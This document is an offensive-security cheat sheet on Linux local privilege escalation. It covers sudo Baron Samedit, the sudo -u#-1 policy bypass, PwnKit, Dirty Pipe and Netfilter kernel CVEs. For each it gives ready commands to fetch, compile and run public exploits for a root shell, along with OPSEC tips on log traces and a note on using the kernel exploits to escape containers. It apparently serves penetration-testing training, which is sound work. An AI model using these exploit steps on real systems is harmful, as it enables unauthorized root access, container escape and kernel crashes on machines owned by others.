# Recent Vulnerabilities
## Sudo Vulnerabilities
**Concept:** `sudo` is the standard tool for delegating privileges. Vulnerabilities here are critical because `sudo` is installed by default on almost every Linux system and carries the SUID bit.
### 1. Baron Samedit (CVE-2021-3156)
**Type:** Heap-based Buffer Overflow. 
**Impact:** Unauthenticated local users can gain root access without a password. 
**Vulnerable Versions:** Legacy (1.8.2 - 1.8.31p2) and Stable (1.9.0 - 1.9.5p1).
#### Identification
```shell
# Description: Check sudo version
sudo -V | head -n1
```
#### Exploitation
**Technique:** Exploits a parsing error in command-line arguments when using `sudoedit -s` with a backslash.
1. **Download PoC:** Clone a reliable exploit (e.g., from blasty).
```shell
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```
2. **Identify Target:** Run the exploit to see supported targets (OS versions).
```shell
./sudo-hax-me-a-sandwich
```
3. **Execute:** Select the target ID matching the OS (e.g., `1` for Ubuntu 20.04).
```shell
# Syntax: ./sudo-hax-me-a-sandwich <Target_ID>
./sudo-hax-me-a-sandwich 1
```
### 2. Sudo Security Policy Bypass (CVE-2019-14287)
**Type:** Logic Flaw. 
**Prerequisite:** You must have a restricted sudo permission in `/etc/sudoers` (e.g., allowed to run `/usr/bin/id` as any user _except_ root). 
**Vulnerable Versions:** < 1.8.28.
#### Exploitation
**Technique:** Sudo treats User ID `-1` or `4294967295` as `0` (root), bypassing the configuration restriction preventing root execution.
```shell
# Description: Execute command as User ID -1 (interpreted as root)
# Syntax: sudo -u#-1 <Allowed_Command>
sudo -u#-1 /usr/bin/id
```
**Result:** Returns `uid=0(root)`.
## Polkit - PwnKit (CVE-2021-4034)
**Concept:** `pkexec` allows users to execute commands as another user (similar to sudo). A memory corruption vulnerability allows manipulating the environment variables to execute arbitrary code as root. 
**Criticality:** Extremely high. Works on default installations of Ubuntu, Debian, Fedora, and CentOS created between 2009 and 2022.
### Exploitation
1. **Preparation:** Download and compile the C exploit (e.g., arthepsy PoC).
```shell
# Description: Compile the PwnKit exploit
gcc cve-2021-4034-poc.c -o poc
```
2. **Execution:** Run the binary. No arguments required.
```shell
./poc
# Spawns a root shell immediately
```
**OPSEC Warning:** This exploit is very noisy in logs. It often leaves traces like "The value for the SHELL variable was not found the /etc/shells file" in `/var/log/auth.log`.
## Dirty Pipe (CVE-2022-0847)
**Concept:** A vulnerability in the Linux Kernel (5.8 - 5.17) allowing unprivileged users to overwrite data in read-only files (like `/etc/passwd` or SUID binaries) via pipe buffers. 
**Constraint:** You must have **read** access to the file you want to overwrite.
### Exploitation Options
There are typically two variants of this exploit:
#### Variant A: Root Password Overwrite
1. **Compile:** `bash compile.sh` (using common PoC suites like AlexisAhmed).
2. **Execute:**
    ```shell
    ./exploit-1
    ```
    - Backs up `/etc/passwd`.
    - Overwrites the root password field (or removes the 'x').
    - Spawns a root shell.
    - Restores `/etc/passwd` upon exit.
#### Variant B: SUID Hijacking
Overwrites a read-only SUID binary temporarily to execute shellcode.
```shell
# Syntax: ./exploit-2 <Target_SUID_Binary>
./exploit-2 /usr/bin/sudo
```
## Netfilter / Kernel Exploits (Advanced)
**Concept:** `Netfilter` is the kernel framework for packet filtering (iptables). Vulnerabilities here allow escalating from user to kernel privileges. 
**Targets:** Often effective in Container environments (Docker/K8s) to escape to the host Kernel.
### Common CVEs
- **CVE-2021-22555:** Heap out-of-bounds write (Kernels 2.6 - 5.11).
- **CVE-2022-25636:** Heap out-of-bounds write in `nf_dup_netdev.c` (Kernels 5.4 - 5.6.10).
- **CVE-2023-32233:** Use-After-Free in `nf_tables` (Kernels < 6.3.1).
### Execution Strategy
1. **Identification:** `uname -r` to match Kernel version.
2. **Compilation:** These are complex C exploits. Compile on the target or a replica VM to ensure library compatibility.
```shell
gcc -m32 -static exploit.c -o exploit
```
3. **Risk:** High probability of Kernel Panic (System Crash). Only use as a last resort in production.